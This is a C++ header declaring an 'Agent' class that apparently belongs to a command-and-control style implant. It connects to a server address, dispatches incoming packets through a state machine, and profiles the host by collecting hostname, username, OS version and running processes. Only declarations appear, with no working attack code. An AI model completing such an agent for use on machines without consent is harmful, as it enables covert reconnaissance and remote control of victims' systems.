#pragma once

#include "../../common/include/Socket.hpp"
#include "../../common/include/Packet.hpp"
#include "ProcessProfiler.hpp"
#include <string>
#include <vector>
#include <atomic>

namespace inferno {

enum class AgentState {
    INIT,
    CONNECTING,
    CONNECTED,
    LISTENING,
    DISPATCHING,
    ERROR
};

class Agent {
public:
    // Coplien Canonical Form
    Agent();
    explicit Agent(const std::string& server_ip, uint16_t server_port);
    ~Agent();
    Agent(const Agent&) = delete;
    Agent& operator=(const Agent&) = delete;
    Agent(Agent&&)            = delete;
    Agent& operator=(Agent&&) = delete;

    // Core Loop
    void run();
    void stop();

private:
    // FSM Handlers
    void handleInit();
    void handleConnecting();
    void handleConnected();
    void handleListening();
    void handleDispatching(Packet&& packet);
    void handleProcessDiscovery();

    // System Profiler (Gourmandise Subsystem)
    std::string getSystemInfo();
    std::string getHostname();
    std::string getUsername();
    std::string getOSVersion();

    // Attributes
    std::string m_server_ip;
    uint16_t m_server_port;
    AgentState m_state;
    Socket m_socket;
    std::atomic<bool> m_running;
    std::vector<uint8_t> m_receive_buffer;
    ProcessProfiler m_profiler;
};

} // namespace inferno
